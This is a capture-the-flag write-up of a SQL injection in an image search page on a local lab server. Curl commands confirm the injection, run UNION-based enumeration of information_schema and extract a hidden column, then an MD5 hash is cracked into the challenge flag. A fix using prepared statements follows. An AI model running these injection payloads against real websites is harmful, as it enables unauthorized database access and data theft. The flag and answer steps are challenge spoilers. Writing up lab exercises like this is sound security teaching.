# SQL Injection — Image Search

## Vulnerability

The image search `id` parameter is concatenated directly into a SQL query — OWASP A03:2021 Injection.

## Steps to Reproduce

### 1. Confirm SQLi — dump all rows
```bash
curl -s "http://localhost/?page=searchimg&id=1+OR+1%3D1&Submit=Submit"
```
Returns all 5 image entries — proves input is injected into SQL.

### 2. Find column count with UNION SELECT
```bash
curl -s "http://localhost/?page=searchimg&id=1+UNION+SELECT+1,2&Submit=Submit"
```
Shows `Title: 2`, `Url: 1` — query returns 2 columns (column 1 → Url, column 2 → Title).

### 3. Enumerate tables and columns in current database
```bash
curl -s "http://localhost/?page=searchimg&id=1+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema%3Ddatabase()&Submit=Submit"
```
Reveals `list_images` table with hidden column: `comment`.

### 4. Extract hidden comment column
```bash
curl -s "http://localhost/?page=searchimg&id=1+UNION+SELECT+comment,title+FROM+list_images&Submit=Submit"
```
Returns:
- `Title: Hack me ?`
- `Comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

### 5. Crack MD5 and compute flag
```bash
# Crack MD5 via rainbow table API (result: albatroz)
curl -s "https://www.nitrxgen.net/md5db/1928e8083cf461a51303633093573c46"

# Alternative: use https://crackstation.net or https://hashes.com/en/decrypt/hash

# Lowercase → SHA-256 = flag
echo -n "albatroz" | shasum -a 256
```

Automated alternative — run `enumerate.py`:
```bash
python enumerate.py
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Why It Works

User input from the `id` parameter is interpolated into a SQL query string without sanitization or parameterization. A UNION-based injection appends a second SELECT to exfiltrate arbitrary table data.

## Fix / Mitigation

- Use parameterized queries / prepared statements:
  ```php
  $stmt = $pdo->prepare("SELECT * FROM images WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  ```
- Validate that `id` is a positive integer before use.
